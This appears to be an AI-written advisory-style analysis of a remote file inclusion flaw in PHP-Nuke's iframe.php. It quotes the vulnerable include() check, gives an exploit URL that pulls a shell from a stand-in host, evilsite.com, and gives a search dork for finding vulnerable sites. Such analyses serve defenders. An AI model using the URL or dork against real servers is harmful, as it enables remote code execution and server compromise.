Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**

*   The `iframe.php` script in PHP-Nuke does not properly sanitize the `file` parameter before including it using `include()`. This allows an attacker to include a remote file by manipulating the `file` parameter.

**Weaknesses/Vulnerabilities:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is RFI. The `iframe.php` script attempts to restrict the included file extensions to `.htm`, `.html`, and `.php`, however, this check is insufficient and can be bypassed by providing a URL with a valid extension for include.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file (e.g., a PHP shell) from a remote server, an attacker can execute arbitrary code on the vulnerable PHP-Nuke server. This could lead to complete compromise of the web server and potentially the underlying system.
*   **Data Theft/Manipulation:**  An attacker could potentially gain access to sensitive data or manipulate data stored on the server.
*   **Denial of Service (DoS):** While not the primary impact, a malicious script could also be used to cause a denial of service.

**Attack Vectors:**

*   **HTTP Request:** The vulnerability is exploited through a specially crafted HTTP GET request to `iframe.php`.
*   **`file` Parameter:** The attacker injects a malicious URL into the `file` parameter, which the `include()` function then processes.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable PHP-Nuke server.
*   **Knowledge of Vulnerability:** The attacker needs to know about the RFI vulnerability in `iframe.php` and how to exploit it.

**Technical Details:**

*   The vulnerable code snippet is:
    ```php
    if(substr($file,-4)!=".htm" && substr($file,-5)!=".html" && substr($file,-4)!=".php"){
       echo "ERROR: ONLY html, htm or php FILES";
       CloseTable();
    } else {
       include ($file);
    }
    ```
*   The exploit URL example is:
    `http://www.example.com/nuke_path/iframe.php?file=ftp://user:pass@evilsite.com/public_html/shell.html`

**Additional Notes:**

*   The exploit example uses an `ftp://` URL, but other protocols like `http://` could be used as well.
*   The dork `/nuke/iframe.php` can help locate vulnerable instances.
*   The exploit-db entry confirms this is a remote file inclusion vulnerability affecting PHP-Nuke.
